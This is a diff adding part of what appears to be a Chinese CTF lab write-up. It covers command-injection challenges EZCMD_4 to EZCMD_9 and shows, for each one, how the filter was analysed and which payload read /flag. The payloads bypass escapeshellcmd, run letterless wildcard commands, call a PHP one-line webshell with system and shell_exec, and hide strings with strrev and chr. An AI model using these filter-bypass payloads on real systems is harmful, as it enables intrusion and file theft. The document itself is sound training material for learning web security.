@@ -1978,12 +1978,279 @@ cmd=cat%09/flag%0a&lt;br&gt;
 	
 &gt;&lt;/p&gt;
 &lt;h3 id=&#34;ezcmd_4&#34;&gt;EZCMD_4
-&lt;/h3&gt;&lt;h3 id=&#34;ezcmd_5&#34;&gt;EZCMD_5
-&lt;/h3&gt;&lt;h3 id=&#34;ezcmd_6&#34;&gt;EZCMD_6
-&lt;/h3&gt;&lt;h3 id=&#34;ezcmd_7&#34;&gt;EZCMD_7
-&lt;/h3&gt;&lt;h3 id=&#34;ezcmd_8&#34;&gt;EZCMD_8
-&lt;/h3&gt;&lt;h3 id=&#34;ezcmd_9&#34;&gt;EZCMD_9
-&lt;/h3&gt;&lt;h3 id=&#34;ezcmd_10&#34;&gt;EZCMD_10
+&lt;/h3&gt;&lt;p&gt;访问靶机&lt;br&gt;
+&lt;img src=&#34;https://xxchen-yu.github.io/p/qingcen%E9%9D%B6%E5%9C%BAweb%E5%85%A5%E9%97%A8wp/IMG/c13.png&#34;
+	width=&#34;1535&#34;
+	height=&#34;872&#34;
+	srcset=&#34;https://xxchen-yu.github.io/p/qingcen%E9%9D%B6%E5%9C%BAweb%E5%85%A5%E9%97%A8wp/IMG/c13_hu_51d7269df9ca282d.png 480w, https://xxchen-yu.github.io/p/qingcen%E9%9D%B6%E5%9C%BAweb%E5%85%A5%E9%97%A8wp/IMG/c13_hu_5035183410f47b52.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;176&#34;
+		data-flex-basis=&#34;422px&#34;
+	
+&gt;&lt;br&gt;
+页面名为robot 我们访问robots.txt&lt;br&gt;
+&lt;img src=&#34;https://xxchen-yu.github.io/p/qingcen%E9%9D%B6%E5%9C%BAweb%E5%85%A5%E9%97%A8wp/IMG/c14.png&#34;
+	width=&#34;437&#34;
+	height=&#34;170&#34;
+	srcset=&#34;https://xxchen-yu.github.io/p/qingcen%E9%9D%B6%E5%9C%BAweb%E5%85%A5%E9%97%A8wp/IMG/c14_hu_af75eb9919db66b5.png 480w, https://xxchen-yu.github.io/p/qingcen%E9%9D%B6%E5%9C%BAweb%E5%85%A5%E9%97%A8wp/IMG/c14_hu_d61a75161e974897.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;257&#34;
+		data-flex-basis=&#34;616px&#34;
+	
+&gt;&lt;br&gt;
+访问4atP5Aup.php&lt;br&gt;
+&lt;img src=&#34;https://xxchen-yu.github.io/p/qingcen%E9%9D%B6%E5%9C%BAweb%E5%85%A5%E9%97%A8wp/IMG/c15.png&#34;
+	width=&#34;2479&#34;
+	height=&#34;309&#34;
+	srcset=&#34;https://xxchen-yu.github.io/p/qingcen%E9%9D%B6%E5%9C%BAweb%E5%85%A5%E9%97%A8wp/IMG/c15_hu_7739d6d9130958c1.png 480w, https://xxchen-yu.github.io/p/qingcen%E9%9D%B6%E5%9C%BAweb%E5%85%A5%E9%97%A8wp/IMG/c15_hu_e40d8618bb8ddf89.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;802&#34;
+		data-flex-basis=&#34;1925px&#34;
+	
+&gt;&lt;br&gt;
+分析条件，看看过滤了哪些命令&lt;br&gt;
+escapeshellcmd()会转义shell命令中的特殊字符，防止命令注入&lt;br&gt;
+我们需要读取flag文件&lt;br&gt;
+cmd=cat /flag-&amp;gt;cmd=dd if=/flag-&amp;gt;cmd=a=fl;b=ag;dd if=/$a$b-&amp;gt;cmd=eval a=fl;b=ag;dd if=/$a$b&lt;br&gt;
+&lt;img src=&#34;https://xxchen-yu.github.io/p/qingcen%E9%9D%B6%E5%9C%BAweb%E5%85%A5%E9%97%A8wp/IMG/c16.png&#34;
+	width=&#34;1240&#34;
+	height=&#34;662&#34;
+	srcset=&#34;https://xxchen-yu.github.io/p/qingcen%E9%9D%B6%E5%9C%BAweb%E5%85%A5%E9%97%A8wp/IMG/c16_hu_dcaaec7c95c475e9.png 480w, https://xxchen-yu.github.io/p/qingcen%E9%9D%B6%E5%9C%BAweb%E5%85%A5%E9%97%A8wp/IMG/c16_hu_951e435e2e54674c.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;获得flag&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;187&#34;
+		data-flex-basis=&#34;449px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h3 id=&#34;ezcmd_5&#34;&gt;EZCMD_5
+&lt;/h3&gt;&lt;p&gt;访问靶机&lt;br&gt;
+&lt;img src=&#34;https://xxchen-yu.github.io/p/qingcen%E9%9D%B6%E5%9C%BAweb%E5%85%A5%E9%97%A8wp/IMG/c17.png&#34;
+	width=&#34;676&#34;
+	height=&#34;368&#34;
+	srcset=&#34;https://xxchen-yu.github.io/p/qingcen%E9%9D%B6%E5%9C%BAweb%E5%85%A5%E9%97%A8wp/IMG/c17_hu_c29651c91afb4a27.png 480w, https://xxchen-yu.github.io/p/qingcen%E9%9D%B6%E5%9C%BAweb%E5%85%A5%E9%97%A8wp/IMG/c17_hu_f871f4c6f1537412.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;183&#34;
+		data-flex-basis=&#34;440px&#34;
+	
+&gt;&lt;br&gt;
+分析条件&lt;br&gt;
+把所有的字母全部过滤，典型的无字母命令执行&lt;br&gt;
+/???/?? 匹配 /bin/ca  (为什么不直接用cat呢，直接用???匹配不到cat,通配符 ? 不会像命令名那样自动搜索 PATH，必须指定完整路径！)&lt;br&gt;
+$&amp;rsquo;\164&amp;rsquo; 是字母 t 的八进制表示（ASCII码116）&lt;br&gt;
+/????.??? 匹配 /flag.txt&lt;br&gt;
+最终执行： /bin/cat /flag.txt&lt;br&gt;
+&lt;img src=&#34;https://xxchen-yu.github.io/p/qingcen%E9%9D%B6%E5%9C%BAweb%E5%85%A5%E9%97%A8wp/IMG/c18.png&#34;
+	width=&#34;745&#34;
+	height=&#34;623&#34;
+	srcset=&#34;https://xxchen-yu.github.io/p/qingcen%E9%9D%B6%E5%9C%BAweb%E5%85%A5%E9%97%A8wp/IMG/c18_hu_c01fc364c5671149.png 480w, https://xxchen-yu.github.io/p/qingcen%E9%9D%B6%E5%9C%BAweb%E5%85%A5%E9%97%A8wp/IMG/c18_hu_1f7ef367e0b724a.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;获得flag&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;119&#34;
+		data-flex-basis=&#34;286px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h3 id=&#34;ezcmd_6&#34;&gt;EZCMD_6
+&lt;/h3&gt;&lt;p&gt;访问靶机&lt;br&gt;
+&lt;img src=&#34;https://xxchen-yu.github.io/p/qingcen%E9%9D%B6%E5%9C%BAweb%E5%85%A5%E9%97%A8wp/IMG/c19.png&#34;
+	width=&#34;395&#34;
+	height=&#34;208&#34;
+	srcset=&#34;https://xxchen-yu.github.io/p/qingcen%E9%9D%B6%E5%9C%BAweb%E5%85%A5%E9%97%A8wp/IMG/c19_hu_e3df0f3743adab10.png 480w, https://xxchen-yu.github.io/p/qingcen%E9%9D%B6%E5%9C%BAweb%E5%85%A5%E9%97%A8wp/IMG/c19_hu_26aa4015c54a65e1.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;189&#34;
+		data-flex-basis=&#34;455px&#34;
+	
+&gt;&lt;br&gt;
+分析条件&lt;br&gt;
+典型的一句话木马&lt;br&gt;
+qc=system(&amp;rsquo;ls /&amp;rsquo;);&lt;br&gt;
+&lt;img src=&#34;https://xxchen-yu.github.io/p/qingcen%E9%9D%B6%E5%9C%BAweb%E5%85%A5%E9%97%A8wp/IMG/c20.png&#34;
+	width=&#34;979&#34;
+	height=&#34;615&#34;
+	srcset=&#34;https://xxchen-yu.github.io/p/qingcen%E9%9D%B6%E5%9C%BAweb%E5%85%A5%E9%97%A8wp/IMG/c20_hu_b100147e1d36c513.png 480w, https://xxchen-yu.github.io/p/qingcen%E9%9D%B6%E5%9C%BAweb%E5%85%A5%E9%97%A8wp/IMG/c20_hu_b834f07f24cb786d.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;159&#34;
+		data-flex-basis=&#34;382px&#34;
+	
+&gt;
+qc=system(&amp;lsquo;cat /flag&amp;rsquo;);&lt;br&gt;
+&lt;img src=&#34;https://xxchen-yu.github.io/p/qingcen%E9%9D%B6%E5%9C%BAweb%E5%85%A5%E9%97%A8wp/IMG/c21.png&#34;
+	width=&#34;627&#34;
+	height=&#34;477&#34;
+	srcset=&#34;https://xxchen-yu.github.io/p/qingcen%E9%9D%B6%E5%9C%BAweb%E5%85%A5%E9%97%A8wp/IMG/c21_hu_61088b0c7db1e74d.png 480w, https://xxchen-yu.github.io/p/qingcen%E9%9D%B6%E5%9C%BAweb%E5%85%A5%E9%97%A8wp/IMG/c21_hu_645da1a577dc1bb7.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;获得flag&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;131&#34;
+		data-flex-basis=&#34;315px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h3 id=&#34;ezcmd_7&#34;&gt;EZCMD_7
+&lt;/h3&gt;&lt;p&gt;访问靶机&lt;br&gt;
+&lt;img src=&#34;https://xxchen-yu.github.io/p/qingcen%E9%9D%B6%E5%9C%BAweb%E5%85%A5%E9%97%A8wp/IMG/c22.png&#34;
+	width=&#34;522&#34;
+	height=&#34;347&#34;
+	srcset=&#34;https://xxchen-yu.github.io/p/qingcen%E9%9D%B6%E5%9C%BAweb%E5%85%A5%E9%97%A8wp/IMG/c22_hu_81b08ddf592dde61.png 480w, https://xxchen-yu.github.io/p/qingcen%E9%9D%B6%E5%9C%BAweb%E5%85%A5%E9%97%A8wp/IMG/c22_hu_825d9ef5d885c474.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;150&#34;
+		data-flex-basis=&#34;361px&#34;
+	
+&gt;&lt;br&gt;
+分析条件&lt;br&gt;
+eval(&amp;rsquo;$qc&amp;rsquo;) 将字符串转换为PHP代码执行&lt;br&gt;
+仅过滤flag  没有过滤ls&lt;br&gt;
+&lt;img src=&#34;https://xxchen-yu.github.io/p/qingcen%E9%9D%B6%E5%9C%BAweb%E5%85%A5%E9%97%A8wp/IMG/c23.png&#34;
+	width=&#34;846&#34;
+	height=&#34;317&#34;
+	srcset=&#34;https://xxchen-yu.github.io/p/qingcen%E9%9D%B6%E5%9C%BAweb%E5%85%A5%E9%97%A8wp/IMG/c23_hu_fa0fd0b5bc059d5.png 480w, https://xxchen-yu.github.io/p/qingcen%E9%9D%B6%E5%9C%BAweb%E5%85%A5%E9%97%A8wp/IMG/c23_hu_1d5a9391a11b7c14.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;266&#34;
+		data-flex-basis=&#34;640px&#34;
+	
+&gt;&lt;br&gt;
+发现flag的路径  /flag&lt;br&gt;
+利用chr() 函数拼接字符串&lt;br&gt;
+echo file_get_contents(&amp;rsquo;/flag&amp;rsquo;);  读取并输出&lt;br&gt;
+&lt;img src=&#34;https://xxchen-yu.github.io/p/qingcen%E9%9D%B6%E5%9C%BAweb%E5%85%A5%E9%97%A8wp/IMG/c24.png&#34;
+	width=&#34;1292&#34;
+	height=&#34;309&#34;
+	srcset=&#34;https://xxchen-yu.github.io/p/qingcen%E9%9D%B6%E5%9C%BAweb%E5%85%A5%E9%97%A8wp/IMG/c24_hu_9d0d985a08e5626.png 480w, https://xxchen-yu.github.io/p/qingcen%E9%9D%B6%E5%9C%BAweb%E5%85%A5%E9%97%A8wp/IMG/c24_hu_a4b3ec232f44bf40.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;flag&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;418&#34;
+		data-flex-basis=&#34;1003px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h3 id=&#34;ezcmd_8&#34;&gt;EZCMD_8
+&lt;/h3&gt;&lt;p&gt;访问靶机&lt;br&gt;
+&lt;img src=&#34;https://xxchen-yu.github.io/p/qingcen%E9%9D%B6%E5%9C%BAweb%E5%85%A5%E9%97%A8wp/IMG/c25.png&#34;
+	width=&#34;636&#34;
+	height=&#34;315&#34;
+	srcset=&#34;https://xxchen-yu.github.io/p/qingcen%E9%9D%B6%E5%9C%BAweb%E5%85%A5%E9%97%A8wp/IMG/c25_hu_de8e38dd3577b099.png 480w, https://xxchen-yu.github.io/p/qingcen%E9%9D%B6%E5%9C%BAweb%E5%85%A5%E9%97%A8wp/IMG/c25_hu_d65445a131a7b76d.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;201&#34;
+		data-flex-basis=&#34;484px&#34;
+	
+&gt;&lt;br&gt;
+分析条件&lt;br&gt;
+过滤了system() 和 flag&lt;br&gt;
+利用shell_exec() 代替 system()&lt;br&gt;
+利用strrev()反转字符串绕过flag&lt;br&gt;
+?qc=echo shell_exec(&amp;rsquo;ls /&amp;rsquo;);&lt;br&gt;
+&lt;img src=&#34;https://xxchen-yu.github.io/p/qingcen%E9%9D%B6%E5%9C%BAweb%E5%85%A5%E9%97%A8wp/IMG/c26.png&#34;
+	width=&#34;870&#34;
+	height=&#34;450&#34;
+	srcset=&#34;https://xxchen-yu.github.io/p/qingcen%E9%9D%B6%E5%9C%BAweb%E5%85%A5%E9%97%A8wp/IMG/c26_hu_667b0ef475bd6689.png 480w, https://xxchen-yu.github.io/p/qingcen%E9%9D%B6%E5%9C%BAweb%E5%85%A5%E9%97%A8wp/IMG/c26_hu_24c0ee42da7c7e85.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;193&#34;
+		data-flex-basis=&#34;464px&#34;
+	
+&gt; &lt;br&gt;
+发现路径&lt;br&gt;
+?qc=readfile(strrev(&amp;lsquo;galf/&amp;rsquo;));&lt;br&gt;
+&lt;img src=&#34;https://xxchen-yu.github.io/p/qingcen%E9%9D%B6%E5%9C%BAweb%E5%85%A5%E9%97%A8wp/IMG/c27.png&#34;
+	width=&#34;793&#34;
+	height=&#34;301&#34;
+	srcset=&#34;https://xxchen-yu.github.io/p/qingcen%E9%9D%B6%E5%9C%BAweb%E5%85%A5%E9%97%A8wp/IMG/c27_hu_915f359c6d1af00d.png 480w, https://xxchen-yu.github.io/p/qingcen%E9%9D%B6%E5%9C%BAweb%E5%85%A5%E9%97%A8wp/IMG/c27_hu_810efac94d1c19e4.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;263&#34;
+		data-flex-basis=&#34;632px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h3 id=&#34;ezcmd_9&#34;&gt;EZCMD_9
+&lt;/h3&gt;&lt;p&gt;访问靶场&lt;br&gt;
+&lt;img src=&#34;https://xxchen-yu.github.io/p/qingcen%E9%9D%B6%E5%9C%BAweb%E5%85%A5%E9%97%A8wp/IMG/c28.png&#34;
+	width=&#34;567&#34;
+	height=&#34;338&#34;
+	srcset=&#34;https://xxchen-yu.github.io/p/qingcen%E9%9D%B6%E5%9C%BAweb%E5%85%A5%E9%97%A8wp/IMG/c28_hu_59dddd37ac4e7ed9.png 480w, https://xxchen-yu.github.io/p/qingcen%E9%9D%B6%E5%9C%BAweb%E5%85%A5%E9%97%A8wp/IMG/c28_hu_bfb694a39eb8ac8c.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;167&#34;
+		data-flex-basis=&#34;402px&#34;
+	
+&gt;&lt;br&gt;
+分析条件&lt;br&gt;
+禁用空格和system()&lt;br&gt;
+scandir(目录路径) 列出目录中的所有文件和文件夹，返回数组  搭配print_r() 打印数组&lt;br&gt;
+?qc=print_r(scandir(&amp;rsquo;/&amp;rsquo;));&lt;br&gt;
+&lt;img src=&#34;https://xxchen-yu.github.io/p/qingcen%E9%9D%B6%E5%9C%BAweb%E5%85%A5%E9%97%A8wp/IMG/c29.png&#34;
+	width=&#34;2495&#34;
+	height=&#34;323&#34;
+	srcset=&#34;https://xxchen-yu.github.io/p/qingcen%E9%9D%B6%E5%9C%BAweb%E5%85%A5%E9%97%A8wp/IMG/c29_hu_88dbff3611a4c50c.png 480w, https://xxchen-yu.github.io/p/qingcen%E9%9D%B6%E5%9C%BAweb%E5%85%A5%E9%97%A8wp/IMG/c29_hu_c9bb50a1aa1f05d7.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;772&#34;
+		data-flex-basis=&#34;1853px&#34;
+	
+&gt;&lt;br&gt;
+发现flag的路径  /flag&lt;br&gt;
+?qc=readfile(&amp;rsquo;/flag&amp;rsquo;);  不含过滤字符&lt;br&gt;
+&lt;img src=&#34;https://xxchen-yu.github.io/p/qingcen%E9%9D%B6%E5%9C%BAweb%E5%85%A5%E9%97%A8wp/IMG/c30.png&#34;
+	width=&#34;710&#34;
+	height=&#34;315&#34;
+	srcset=&#34;https://xxchen-yu.github.io/p/qingcen%E9%9D%B6%E5%9C%BAweb%E5%85%A5%E9%97%A8wp/IMG/c30_hu_899f4480928edb7d.png 480w, https://xxchen-yu.github.io/p/qingcen%E9%9D%B6%E5%9C%BAweb%E5%85%A5%E9%97%A8wp/IMG/c30_hu_f3fb8e5615335454.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;flag&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;225&#34;
+		data-flex-basis=&#34;540px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h3 id=&#34;ezcmd_10&#34;&gt;EZCMD_10
 &lt;/h3&gt;&lt;h3 id=&#34;ezcmd_11&#34;&gt;EZCMD_11
 &lt;/h3&gt;&lt;h3 id=&#34;ezcmd_12&#34;&gt;EZCMD_12
 &lt;/h3&gt;&lt;h3 id=&#34;ezcmd_13&#34;&gt;EZCMD_13
